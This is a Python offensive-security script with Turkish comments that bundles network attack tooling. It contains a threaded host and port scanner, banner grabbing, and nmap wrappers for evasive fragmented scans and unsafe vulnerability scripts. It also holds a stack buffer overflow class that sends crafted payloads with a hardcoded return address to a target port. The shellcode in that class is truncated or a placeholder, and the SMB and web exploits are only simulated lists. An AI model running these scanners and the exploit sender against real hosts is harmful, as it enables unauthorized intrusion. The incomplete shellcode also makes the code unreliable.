#!/usr/bin/env python3
"""
Ağ Penetrasyon Testi Framework
Author: ibrahimsql
Description: Kapsamlı ağ penetrasyon testi araçları ve teknikleri
"""

import subprocess
import json
import xml.etree.ElementTree as ET
from datetime import datetime
import ipaddress
import socket
import threading
import time
import struct
import queue
import re
import requests
import nmap
from typing import Dict, List, Optional, Any, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

class NetworkPentestFramework:
    """Ağ penetrasyon testi yaşam döngüsü framework'ü"""
    
    def __init__(self, target_network):
        self.target_network = target_network
        self.discovered_hosts = []
        self.open_ports = {}
        self.vulnerabilities = []
        self.exploited_hosts = []
        self.report_data = {
            'start_time': datetime.now().isoformat(),
            'target': target_network,
            'phases': {}
        }
    
    def phase_1_reconnaissance(self):
        """Faz 1: Keşif ve Bilgi Toplama"""
        print("[+] Faz 1: Reconnaissance başlatılıyor...")
        
        # Passive reconnaissance
        passive_info = self.passive_reconnaissance()
        
        # Active reconnaissance
        active_info = self.active_reconnaissance()
        
        self.report_data['phases']['reconnaissance'] = {
            'passive': passive_info,
            'active': active_info,
            'timestamp': datetime.now().isoformat()
        }
        
        return passive_info, active_info
    
    def passive_reconnaissance(self):
        """Pasif keşif teknikleri"""
        info = {
            'dns_enumeration': [],
            'whois_data': {},
            'search_engine_recon': [],
            'social_media_intel': []
        }
        
        # DNS enumeration
        try:
            # DNS zone transfer attempt
            dns_servers = self.find_dns_servers()
            for dns_server in dns_servers:
                zone_data = self.attempt_zone_transfer(dns_server)
                if zone_data:
                    info['dns_enumeration'].append({
                        'server': dns_server,
                        'zone_data': zone_data
                    })
        except Exception as e:
            print(f"[-] DNS enumeration hatası: {e}")
        
        return info
    
    def active_reconnaissance(self):
        """Aktif keşif teknikleri"""
        info = {
            'host_discovery': [],
            'port_scanning': {},
            'service_enumeration': {},
            'os_fingerprinting': {}
        }
        
        # Host discovery
        self.discovered_hosts = self.discover_hosts()
        info['host_discovery'] = self.discovered_hosts
        
        # Port scanning for each discovered host
        for host in self.discovered_hosts:
            ports = self.port_scan(host)
            self.open_ports[host] = ports
            info['port_scanning'][host] = ports
            
            # Service enumeration
            services = self.enumerate_services(host, ports)
            info['service_enumeration'][host] = services
            
            # OS fingerprinting
            os_info = self.os_fingerprint(host)
            info['os_fingerprinting'][host] = os_info
        
        return info
    
    def discover_hosts(self):
        """Ağdaki aktif hostları keşfet"""
        hosts = []
        network = ipaddress.ip_network(self.target_network, strict=False)
        
        print(f"[+] {network} ağında host keşfi yapılıyor...")
        
        # Ping sweep
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(self.ping_host, str(ip)): str(ip) for ip in network.hosts()}
            
            for future in as_completed(futures):
                ip = futures[future]
                try:
                    if future.result():
                        hosts.append(ip)
                        print(f"[+] Aktif host bulundu: {ip}")
                except Exception as e:
                    print(f"[-] {ip} ping hatası: {e}")
        
        return hosts
    
    def ping_host(self, host):
        """Host'un aktif olup olmadığını kontrol et"""
        try:
            result = subprocess.run(
                ['ping', '-c', '1', '-W', '1000', host],
                capture_output=True,
                text=True,
                timeout=2
            )
            return result.returncode == 0
        except:
            return False
    
    def port_scan(self, host):
        """Belirtilen host'ta port taraması yap"""
        open_ports = []
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080]
        
        print(f"[+] {host} için port taraması yapılıyor...")
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(self.check_port, host, port): port for port in common_ports}
            
            for future in as_completed(futures):
                port = futures[future]
                try:
                    if future.result():
                        open_ports.append(port)
                        print(f"[+] Açık port bulundu: {host}:{port}")
                except Exception as e:
                    print(f"[-] {host}:{port} tarama hatası: {e}")
        
        return sorted(open_ports)
    
    def check_port(self, host, port):
        """Belirtilen port'un açık olup olmadığını kontrol et"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def enumerate_services(self, host, ports):
        """Açık portlardaki servisleri enumerate et"""
        services = {}
        
        for port in ports:
            try:
                service_info = self.banner_grab(host, port)
                services[port] = service_info
            except Exception as e:
                services[port] = {'error': str(e)}
        
        return services
    
    def banner_grab(self, host, port):
        """Banner grabbing ile servis bilgisi al"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((host, port))
            
            # HTTP servisleri için özel istek
            if port in [80, 443, 8080, 8443]:
                sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
            else:
                sock.send(b"\r\n")
            
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            return {
                'banner': banner.strip(),
                'service': self.identify_service(port, banner)
            }
        except Exception as e:
            return {'error': str(e)}
    
    def identify_service(self, port, banner):
        """Port ve banner bilgisine göre servisi tanımla"""
        common_services = {
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            80: 'HTTP',
            110: 'POP3',
            143: 'IMAP',
            443: 'HTTPS',
            993: 'IMAPS',
            995: 'POP3S',
            3306: 'MySQL',
            3389: 'RDP',
            5432: 'PostgreSQL'
        }
        
        service = common_services.get(port, 'Unknown')
        
        # Banner'dan daha spesifik bilgi çıkar
        if 'apache' in banner.lower():
            service += ' (Apache)'
        elif 'nginx' in banner.lower():
            service += ' (Nginx)'
        elif 'microsoft' in banner.lower():
            service += ' (Microsoft)'
        
        return service
    
    def os_fingerprint(self, host):
        """İşletim sistemi parmak izi alma"""
        try:
            # TTL değeri ile basit OS detection
            result = subprocess.run(
                ['ping', '-c', '1', host],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if 'ttl=' in result.stdout.lower():
                ttl_match = re.search(r'ttl=(\d+)', result.stdout.lower())
                if ttl_match:
                    ttl = int(ttl_match.group(1))
                    
                    if ttl <= 64:
                        return {'os': 'Linux/Unix', 'ttl': ttl}
                    elif ttl <= 128:
                        return {'os': 'Windows', 'ttl': ttl}
                    else:
                        return {'os': 'Unknown', 'ttl': ttl}
            
            return {'os': 'Unknown', 'ttl': None}
        except Exception as e:
            return {'error': str(e)}
    
    def find_dns_servers(self):
        """DNS sunucularını bul"""
        # Basit DNS sunucu listesi
        return ['8.8.8.8', '1.1.1.1']
    
    def attempt_zone_transfer(self, dns_server):
        """DNS zone transfer denemesi"""
        # Bu gerçek uygulamada dig komutu kullanılır
        return None

class AdvancedNmapScanner:
    """Gelişmiş Nmap tarama araçları"""
    
    def __init__(self):
        self.scan_results = {}
        self.scan_queue = queue.Queue()
        self.threads = []
    
    def stealth_scan(self, target):
        """Stealth SYN tarama"""
        print(f"[+] Stealth SYN tarama başlatılıyor: {target}")
        
        cmd = [
            'nmap',
            '-sS',  # SYN scan
            '-T2',  # Slow timing
            '-f',   # Fragment packets
            '--randomize-hosts',
            '--data-length', '25',
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return self.parse_nmap_output(result.stdout)
        except Exception as e:
            return {'error': str(e)}
    
    def comprehensive_scan(self, target):
        """Kapsamlı tarama"""
        print(f"[+] Kapsamlı tarama başlatılıyor: {target}")
        
        cmd = [
            'nmap',
            '-sS', '-sU',  # TCP SYN + UDP scan
            '-A',          # Aggressive scan
            '-T4',         # Aggressive timing
            '-p-',         # All ports
            '--script', 'default,vuln',
            '-oX', f'scan_{target.replace("/", "_")}.xml',
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=1800)
            return self.parse_nmap_output(result.stdout)
        except Exception as e:
            return {'error': str(e)}
    
    def service_version_scan(self, target):
        """Servis versiyonu tarama"""
        print(f"[+] Servis versiyonu tarama: {target}")
        
        cmd = [
            'nmap',
            '-sV',         # Version detection
            '--version-intensity', '9',
            '-T4',
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return self.parse_nmap_output(result.stdout)
        except Exception as e:
            return {'error': str(e)}
    
    def os_detection_scan(self, target):
        """İşletim sistemi tespit tarama"""
        print(f"[+] OS detection tarama: {target}")
        
        cmd = [
            'nmap',
            '-O',          # OS detection
            '--osscan-guess',
            '--max-os-tries', '2',
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return self.parse_nmap_output(result.stdout)
        except Exception as e:
            return {'error': str(e)}
    
    def vulnerability_scan(self, target):
        """Zafiyet tarama"""
        print(f"[+] Vulnerability tarama: {target}")
        
        cmd = [
            'nmap',
            '--script', 'vuln',
            '--script-args', 'unsafe=1',
            '-T4',
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=900)
            return self.parse_nmap_output(result.stdout)
        except Exception as e:
            return {'error': str(e)}
    
    def parse_nmap_output(self, output):
        """Nmap çıktısını parse et"""
        results = {
            'hosts': [],
            'open_ports': {},
            'services': {},
            'vulnerabilities': []
        }
        
        lines = output.split('\n')
        current_host = None
        
        for line in lines:
            line = line.strip()
            
            # Host bilgisi
            if 'Nmap scan report for' in line:
                current_host = line.split('for ')[-1].split(' ')[0]
                results['hosts'].append(current_host)
                results['open_ports'][current_host] = []
                results['services'][current_host] = {}
            
            # Port bilgisi
            elif '/tcp' in line or '/udp' in line:
                if current_host:
                    parts = line.split()
                    if len(parts) >= 3:
                        port_info = parts[0]
                        state = parts[1]
                        service = parts[2] if len(parts) > 2 else 'unknown'
                        
                        if 'open' in state:
                            port_num = port_info.split('/')[0]
                            results['open_ports'][current_host].append(int(port_num))
                            results['services'][current_host][int(port_num)] = service
        
        return results
    
    def threaded_scan(self, targets, scan_type='stealth'):
        """Çoklu thread ile tarama"""
        results = {}
        
        def scan_worker(target):
            if scan_type == 'stealth':
                result = self.stealth_scan(target)
            elif scan_type == 'comprehensive':
                result = self.comprehensive_scan(target)
            elif scan_type == 'service':
                result = self.service_version_scan(target)
            else:
                result = self.vulnerability_scan(target)
            
            results[target] = result
        
        threads = []
        for target in targets:
            thread = threading.Thread(target=scan_worker, args=(target,))
            thread.start()
            threads.append(thread)
        
        # Tüm thread'lerin bitmesini bekle
        for thread in threads:
            thread.join()
        
        return results

class BufferOverflowExploit:
    """Buffer overflow exploit geliştirme framework'ü"""
    
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.offset = 0
        self.bad_chars = []
        self.return_address = 0
        self.shellcode = b""
    
    def find_offset(self, pattern_length=1000):
        """EIP offset'ini bul"""
        print("[+] EIP offset bulunuyor...")
        
        # Basit cyclic pattern oluştur
        pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9" * (pattern_length // 60 + 1)
        pattern = pattern[:pattern_length]
        
        try:
            # Hedef servise bağlan
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_ip, self.target_port))
            
            # Pattern'i gönder
            sock.send(pattern)
            
            # Crash'i bekle
            time.sleep(2)
            sock.close()
            
            print("[*] Servis crash oldu. EIP değerini manuel olarak kontrol edin.")
            print(f"[*] Pattern: {pattern[:100]}...")
            
        except Exception as e:
            print(f"[-] Offset bulma hatası: {e}")
    
    def set_offset(self, offset):
        """EIP offset'ini ayarla"""
        self.offset = offset
        print(f"[+] EIP offset ayarlandı: {offset}")
    
    def find_bad_characters(self):
        """Kötü karakterleri bul"""
        print("[+] Kötü karakterler bulunuyor...")
        
        # Tüm karakterleri içeren string oluştur
        all_chars = b""
        for i in range(1, 256):
            all_chars += struct.pack("B", i)
        
        # Buffer oluştur
        buffer = b"A" * self.offset
        buffer += b"BBBB"  # EIP
        buffer += all_chars
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_ip, self.target_port))
            sock.send(buffer)
            time.sleep(2)
            sock.close()
            
            print("[*] Karakterler gönderildi. ESP'yi manuel olarak kontrol edin.")
            print("[*] Eksik veya değişen karakterler kötü karakterlerdir.")
            
        except Exception as e:
            print(f"[-] Kötü karakter bulma hatası: {e}")
    
    def set_bad_characters(self, bad_chars):
        """Kötü karakterleri ayarla"""
        self.bad_chars = bad_chars
        print(f"[+] Kötü karakterler ayarlandı: {[hex(c) for c in bad_chars]}")
    
    def find_jmp_esp(self):
        """JMP ESP adresini bul"""
        print("[+] JMP ESP adresi bulunuyor...")
        print("[*] Mona.py veya ROPgadget kullanarak JMP ESP adresi bulun:")
        print("[*] !mona jmp -r esp -cpb \"\\x00\\x0a\\x0d\"")
        print("[*] ROPgadget --binary program.exe --only 'jmp|call' | grep esp")
    
    def set_return_address(self, address):
        """Return adresini ayarla"""
        self.return_address = address
        print(f"[+] Return adresi ayarlandı: {hex(address)}")
    
    def generate_shellcode(self, payload_type='calc', lhost='192.168.1.100', lport=4444):
        """Shellcode oluştur"""
        print(f"[+] {payload_type} shellcode oluşturuluyor...")
        
        if payload_type == 'calc':
            # Calc.exe shellcode (test için)
            self.shellcode = (
                b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
                b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
            )
        elif payload_type == 'reverse_shell':
            # Reverse shell shellcode placeholder
            self.shellcode = b"\x90" * 16 + b"REVERSE_SHELL_PLACEHOLDER"
        else:
            # NOP sled
            self.shellcode = b"\x90" * 100
        
        # Kötü karakterleri kontrol et
        for bad_char in self.bad_chars:
            if bad_char in self.shellcode:
                print(f"[!] Uyarı: Shellcode'da kötü karakter bulundu: {hex(bad_char)}")
        
        print(f"[+] Shellcode oluşturuldu ({len(self.shellcode)} bytes)")
    
    def create_exploit(self):
        """Final exploit'i oluştur"""
        if not all([self.offset, self.return_address, self.shellcode]):
            print("[-] Eksik parametreler! Offset, return address ve shellcode gerekli.")
            return None
        
        # Buffer oluştur
        buffer = b"A" * self.offset
        buffer += struct.pack("<L", self.return_address)  # EIP
        buffer += b"\x90" * 16  # NOP sled
        buffer += self.shellcode
        
        print(f"[+] Exploit oluşturuldu ({len(buffer)} bytes)")
        return buffer
    
    def send_exploit(self, exploit_buffer):
        """Exploit'i gönder"""
        try:
            print(f"[+] Exploit gönderiliyor: {self.target_ip}:{self.target_port}")
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_ip, self.target_port))
            sock.send(exploit_buffer)
            
            print("[+] Exploit gönderildi!")
            
            # Response bekle
            try:
                response = sock.recv(1024)
                print(f"[+] Response: {response}")
            except:
                pass
            
            sock.close()
            
        except Exception as e:
            print(f"[-] Exploit gönderme hatası: {e}")

class NetworkExploitFramework:
    """Ağ exploit framework'ü"""
    
    def __init__(self):
        self.exploits = {
            'smb': self.smb_exploits,
            'ssh': self.ssh_exploits,
            'web': self.web_exploits,
            'ftp': self.ftp_exploits
        }
    
    def smb_exploits(self, target):
        """SMB zafiyetleri"""
        exploits = [
            'EternalBlue (MS17-010)',
            'SMBGhost (CVE-2020-0796)',
            'SMB Relay Attack'
        ]
        
        results = []
        for exploit in exploits:
            # Gerçek exploit kodu burada olacak
            results.append({
                'exploit': exploit,
                'status': 'simulated',
                'target': target
            })
        
        return results
    
    def ssh_exploits(self, target):
        """SSH zafiyetleri"""
        exploits = [
            'SSH Brute Force',
            'SSH Key Enumeration',
            'SSH Version Exploits'
        ]
        
        results = []
        for exploit in exploits:
            results.append({
                'exploit': exploit,
                'status': 'simulated',
                'target': target
            })
        
        return results
    
    def web_exploits(self, target):
        """Web uygulama zafiyetleri"""
        exploits = [
            'SQL Injection',
            'XSS (Cross-Site Scripting)',
            'Directory Traversal',
            'Command Injection'
        ]
        
        results = []
        for exploit in exploits:
            results.append({
                'exploit': exploit,
                'status': 'simulated',
                'target': target
            })
        
        return results
    
    def ftp_exploits(self, target):
        """FTP zafiyetleri"""
        exploits = [
            'FTP Anonymous Login',
            'FTP Brute Force',
            'FTP Buffer Overflow'
        ]
        
        results = []
        for exploit in exploits:
            results.append({
                'exploit': exploit,
                'status': 'simulated',
                'target': target
            })
        
        return results
    
    def run_exploits(self, target, service_type):
        """Belirtilen servis türü için exploit'leri çalıştır"""
        if service_type in self.exploits:
            return self.exploits[service_type](target)
        else:
            return [{'error': f'Unknown service type: {service_type}'}]

# Kullanım örnekleri
if __name__ == "__main__":
    print("🔍 Network Penetration Testing Framework")
    print("⚠️  Bu araçları sadece sahip olduğunuz veya izin aldığınız sistemlerde kullanın!")
    
    # Network pentest framework örneği
    target_network = "192.168.1.0/24"
    pentest = NetworkPentestFramework(target_network)
    
    print(f"\n🎯 Hedef ağ: {target_network}")
    
    # Reconnaissance phase
    passive_info, active_info = pentest.phase_1_reconnaissance()
    
    print(f"\n📊 Bulunan hostlar: {len(pentest.discovered_hosts)}")
    for host in pentest.discovered_hosts[:5]:  # İlk 5 host
        print(f"  - {host}")
    
    # Nmap scanner örneği
    nmap_scanner = AdvancedNmapScanner()
    
    if pentest.discovered_hosts:
        target_host = pentest.discovered_hosts[0]
        print(f"\n🔍 {target_host} için detaylı tarama...")
        
        # Stealth scan
        stealth_results = nmap_scanner.stealth_scan(target_host)
        print(f"Stealth scan tamamlandı: {len(stealth_results.get('hosts', []))} host")
    
    # Buffer overflow exploit örneği
    print("\n💥 Buffer Overflow Exploit Framework")
    bof_exploit = BufferOverflowExploit("192.168.1.100", 9999)
    
    # Exploit parametrelerini ayarla
    bof_exploit.set_offset(1978)
    bof_exploit.set_bad_characters([0x00, 0x0a, 0x0d])
    bof_exploit.set_return_address(0x625011af)
    bof_exploit.generate_shellcode('calc')
    
    # Exploit oluştur
    exploit_buffer = bof_exploit.create_exploit()
    if exploit_buffer:
        print(f"✅ Exploit hazır ({len(exploit_buffer)} bytes)")
    
    # Network exploit framework
    exploit_framework = NetworkExploitFramework()
    
    if pentest.discovered_hosts:
        target_host = pentest.discovered_hosts[0]
        print(f"\n🎯 {target_host} için exploit'ler test ediliyor...")
        
        # SMB exploits
        smb_results = exploit_framework.run_exploits(target_host, 'smb')
        print(f"SMB exploits: {len(smb_results)} test")
        
        # Web exploits
        web_results = exploit_framework.run_exploits(target_host, 'web')
        print(f"Web exploits: {len(web_results)} test")
    
    print("\n✅ Network Penetration Testing Framework tamamlandı!")
    print("📝 Detaylı rapor için log dosyalarını kontrol edin.")